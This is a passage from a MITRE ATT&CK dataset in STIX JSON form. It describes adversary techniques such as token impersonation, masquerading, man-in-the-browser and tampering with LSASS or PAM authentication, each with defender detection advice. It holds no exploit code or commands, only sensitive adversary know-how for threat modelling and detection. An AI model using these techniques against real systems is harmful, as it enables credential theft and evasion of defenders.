2019.\",\"source_name\":\"LOLBAS Msbuild\",\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/Msbuild/\"}],\"id\":\"attack-pattern--c92e3d68-2349-49e4-a341-7edca2deff96\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-08T23:29:28.074Z\",\"name\":\"MSBuild\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\"],\"x_mitre_detection\":\"Use process monitoring to monitor the execution and arguments of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\" .NET Framework version 4 or higher\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-15T16:21:45.131Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may communicate using application layer protocols associated with electronic map delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. \",\"external_references\":[{\"external_id\":\"T1071.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1071/003\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--54b4c251-1f0e-4eba-ba6b-dbc7a6f6f06b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-26T20:28:00.985Z\",\"name\":\"Mail Protocols\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Network protocol analysis\",\"Process monitoring\",\"Process use of network\",\"Netflow/Enclave netflow\",\"Packet capture\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-18T18:03:37.481Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the <code>LogonUser</code> function. The function will return a copy of the new session\'s access token and the adversary can use <code>SetThreadToken</code> to assign the token to a thread.\",\"external_references\":[{\"external_id\":\"T1134.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1134/003\"},{\"description\":\"Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.\",\"source_name\":\"Microsoft Command-line Logging\",\"url\":\"https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing\"}],\"id\":\"attack-pattern--8cdeb020-e31e-4f88-a582-f53dcfbda819\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-02-18T18:03:37.481Z\",\"name\":\"Make and Impersonate Token\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"Access tokens\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Windows User Account Control\",\"System access controls\",\"File system access controls\"],\"x_mitre_detection\":\"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\\n\\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.\\n\\nAnalysts can also monitor for use of Windows APIs such as <code>LogonUser</code> and <code> SetThreadToken</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\",\"x_mitre_effective_permissions\":[\"SYSTEM\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-11T14:49:36.954Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\\n\\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) on the file to increase the likelihood that a user will open it.\\n\\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user\'s desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\",\"external_references\":[{\"external_id\":\"T1204.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1204/002\"}],\"id\":\"attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-03-11T14:55:56.177Z\",\"name\":\"Malicious File\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Anti-virus\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\\n\\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user\'s computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-11T14:43:31.706Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).\",\"external_references\":[{\"external_id\":\"T1204.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1204/001\"}],\"id\":\"attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-03-11T14:43:31.706Z\",\"name\":\"Malicious Link\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Anti-virus\",\"Process monitoring\",\"Web proxy\"],\"x_mitre_detection\":\"Inspect network traffic for indications that a user visited a malicious site, such as links included in phishing campaigns directed at your organization.\\n\\nAnti-virus can potentially detect malicious documents and files that are downloaded from a link and executed on the user\'s computer.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques. (Citation: Wikipedia Man in the Browser)\\n\\nA specific example is when an adversary injects software into a browser that allows an them to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the browser as a way to pivot into an authenticated intranet. (Citation: Cobalt Strike Browser Pivot) (Citation: ICEBRG Chrome Extensions)\\n\\nBrowser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary\'s browser through the user\'s browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user\'s traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication. (Citation: cobaltstrike manual)\",\"external_references\":[{\"external_id\":\"T1185\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1185\"},{\"description\":\"Wikipedia. (2017, October 28). Man-in-the-browser. Retrieved January 10, 2018.\",\"source_name\":\"Wikipedia Man in the Browser\",\"url\":\"https://en.wikipedia.org/wiki/Man-in-the-browser\"},{\"description\":\"Mudge, R. (n.d.). Browser Pivoting. Retrieved January 10, 2018.\",\"source_name\":\"Cobalt Strike Browser Pivot\",\"url\":\"https://www.cobaltstrike.com/help-browser-pivoting\"},{\"description\":\"De Tore, M., Warner, J. (2018, January 15). MALICIOUS CHROME EXTENSIONS ENABLE CRIMINALS TO IMPACT OVER HALF A MILLION USERS AND GLOBAL BUSINESSES. Retrieved January 17, 2018.\",\"source_name\":\"ICEBRG Chrome Extensions\",\"url\":\"https://www.icebrg.io/blog/malicious-chrome-extensions-enable-criminals-to-impact-over-half-a-million-users-and-global-businesses\"},{\"description\":\"Strategic Cyber LLC. (2017, March 14). Cobalt Strike Manual. Retrieved May 24, 2017.\",\"source_name\":\"cobaltstrike manual\",\"url\":\"https://cobaltstrike.com/downloads/csmanual38.pdf\"}],\"id\":\"attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2019-07-18T15:36:27.346Z\",\"name\":\"Man in the Browser\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Justin Warner, ICEBRG\"],\"x_mitre_data_sources\":[\"Authentication logs\",\"Packet capture\",\"Process monitoring\",\"API monitoring\"],\"x_mitre_detection\":\"This is a difficult technique to detect because adversary traffic would be masked by normal user traffic. No new processes are created and no additional software touches disk. Authentication logs can be used to audit logins to specific web applications, but determining malicious logins versus benign logins may be difficult if activity matches typical user behavior. Monitor for process injection against browser applications\",\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T19:07:12.114Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to position themselves between two or more networked devices using a man-in-the-middle (MiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\\n\\nAdversaries may leverage the MiTM position to attempt to modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can also stop traffic from flowing to the appropriate destination, causing denial of service.\",\"external_references\":[{\"external_id\":\"T1557\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1557\"},{\"external_id\":\"CAPEC-94\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/94.html\"},{\"description\":\"Rapid7. (n.d.). Man-in-the-Middle (MITM) Attacks. Retrieved March 2, 2020.\",\"source_name\":\"Rapid7 MiTM Basics\",\"url\":\"https://www.rapid7.com/fundamentals/man-in-the-middle-attacks/\"}],\"id\":\"attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-31T13:54:08.535Z\",\"name\":\"Man-in-the-Middle\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Daniil Yugoslavskiy, @yugoslavskiy, Atomic Threat Coverage project\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Netflow/Enclave netflow\",\"Packet capture\"],\"x_mitre_detection\":\"Monitor network traffic for anomalies associated with known MiTM behavior. Consider monitoring for modifications to system configuration files involved in shaping network traffic flow.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\",\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-10T20:30:07.426Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\\n\\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)\",\"external_references\":[{\"external_id\":\"T1036.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1036/004\"},{\"description\":\"Microsoft. (n.d.). Schtasks. Retrieved April 28, 2016.\",\"source_name\":\"TechNet Schtasks\",\"url\":\"https://technet.microsoft.com/en-us/library/bb490996.aspx\"},{\"description\":\"Freedesktop.org. (n.d.). systemd.service — Service unit configuration. Retrieved March 16, 2020.\",\"source_name\":\"Systemd Service Units\",\"url\":\"https://www.freedesktop.org/software/systemd/man/systemd.service.html\"},{\"description\":\"Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack Wiper. Retrieved January 11, 2017.\",\"source_name\":\"Palo Alto Shamoon Nov 2016\",\"url\":\"http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/\"},{\"description\":\"Doctor Web. (2014, November 21). Linux.BackDoor.Fysbis.1. Retrieved December 7, 2017.\",\"source_name\":\"Fysbis Dr Web Analysis\",\"url\":\"https://vms.drweb.com/virus/?i=4276269\"}],\"id\":\"attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T20:21:11.895Z\",\"name\":\"Masquerade Task or Service\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows Registry\",\"Process monitoring\",\"Process command-line parameters\",\"Windows event logs\"],\"x_mitre_detection\":\"Look for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:38.511Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\\n\\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)\",\"external_references\":[{\"external_id\":\"T1036\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1036\"},{\"external_id\":\"CAPEC-177\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/177.html\"},{\"description\":\"LOLBAS. (n.d.). Living Off The Land Binaries and Scripts (and also Libraries). Retrieved February 10, 2020.\",\"source_name\":\"LOLBAS Main Site\",\"url\":\"https://lolbas-project.github.io/\"},{\"description\":\"Ewing, P. (2016, October 31). How to Hunt: The Masquerade Ball. Retrieved October 31, 2016.\",\"source_name\":\"Endgame Masquerade Ball\",\"url\":\"http://pages.endgame.com/rs/627-YBU-612/images/EndgameJournal_The%20Masquerade%20Ball_Pages_R2.pdf\"},{\"description\":\"Carr, N.. (2018, October 25). Nick Carr Status Update Masquerading. Retrieved April 22, 2019.\",\"source_name\":\"Twitter ItsReallyNick Masquerading Update\",\"url\":\"https://twitter.com/ItsReallyNick/status/1055321652777619457\"}],\"id\":\"attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:11:46.544Z\",\"name\":\"Masquerading\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Oleg Kolesnikov, Securonix\",\"Nick Carr, FireEye\",\"David Lu, Tripwire\",\"Felipe Espósito, @Pr0teus\",\"ENDGAME\",\"Bartosz Jerzman\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"File monitoring\",\"Process monitoring\",\"Binary file metadata\"],\"x_mitre_defense_bypassed\":[\"Application control by file name or path\"],\"x_mitre_detection\":\"Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\\n\\nIf file names are mismatched between the file name on disk and that of the binary\'s PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Endgame Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\\n\\nLook for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters\\\"\\\\u202E\\\", \\\"[U+202E]\\\", and \\\"%E2%80%AE”.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.3\"}",
    "{\"created\":\"2020-02-10T20:43:10.239Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may match or approximate the name or location of legitimate files when naming/placing their files. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous.\\n\\nAdversaries may also use the same icon of the file they are trying to mimic.\",\"external_references\":[{\"external_id\":\"T1036.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1036/005\"},{\"external_id\":\"CAPEC-177\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/177.html\"},{\"description\":\"Ewing, P. (2016, October 31). How to Hunt: The Masquerade Ball. Retrieved October 31, 2016.\",\"source_name\":\"Endgame Masquerade Ball\",\"url\":\"http://pages.endgame.com/rs/627-YBU-612/images/EndgameJournal_The%20Masquerade%20Ball_Pages_R2.pdf\"},{\"description\":\"Carr, N.. (2018, October 25). Nick Carr Status Update Masquerading. Retrieved April 22, 2019.\",\"source_name\":\"Twitter ItsReallyNick Masquerading Update\",\"url\":\"https://twitter.com/ItsReallyNick/status/1055321652777619457\"}],\"id\":\"attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:11:45.970Z\",\"name\":\"Match Legitimate Name or Location\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\",\"Binary file metadata\"],\"x_mitre_defense_bypassed\":[\"Application control by file name or path\"],\"x_mitre_detection\":\"Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\\n\\nIf file names are mismatched between the file name on disk and that of the binary\'s PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Endgame Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T19:01:56.887Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows or pluggable authentication modules (PAM) on Unix-based systems, responsible for gathering, storing, and validating credentials. \\n\\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. \",\"external_references\":[{\"external_id\":\"T1556\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1556\"},{\"description\":\"Bialek, J. (2013, September 15). Intercepting Password Changes With Function Hooking. Retrieved November 21, 2017.\",\"source_name\":\"Clymb3r Function Hook Passwords Sept 2013\",\"url\":\"https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/\"},{\"description\":\"Dell SecureWorks. (2015, January 12). Skeleton Key Malware Analysis. Retrieved April 8, 2019.\",\"source_name\":\"Dell Skeleton\",\"url\":\"https://www.secureworks.com/research/skeleton-key-malware-analysis\"},{\"description\":\"Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.\",\"source_name\":\"TechNet Audit Policy\",\"url\":\"https://technet.microsoft.com/en-us/library/dn487457.aspx\"}],\"id\":\"attack-pattern--f4c1826f-a322-41cd-9557-562100848c84\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-30T19:16:10.253Z\",\"name\":\"Modify Authentication Process\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Authentication logs\",\"API monitoring\",\"Windows Registry\",\"Process monitoring\",\"DLL monitoring\"],\"x_mitre_detection\":\"Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\Notification Packages</code>) and correlate then investigate the DLL files these files reference. \\n\\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)\\n\\nMonitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton) \\n\\nMonitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\\n\\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Windows\",\"Linux\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-08-30T18:03:05.864Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may attempt to modify a cloud account\'s compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\\n\\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)\",\"external_references\":[{\"external_id\":\"T1578\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1578\"},{\"description\":\"FireEye / Mandiant. (2020, February). M-Trends 2020. Retrieved April 24, 2020.\",\"source_name\":\"Mandiant M-Trends 2020\",\"url\":\"https://content.fireeye.com/m-trends/rpt-m-trends-2020\"}],\"id\":\"attack-pattern--144e007b-e638-431d-a894-45d90c54ab90\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-19T14:46:00.117Z\",\"name\":\"Modify Cloud Compute Infrastructure\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Stackdriver logs\",\"GCP audit logs\",\"Azure activity logs\",\"AWS CloudTrail logs\"],\"x_mitre_detection\":\"Establish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the creation of multiple snapshots within a short period of time or the mount of a snapshot to a new instance by a new or unexpected user. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.0\"}",
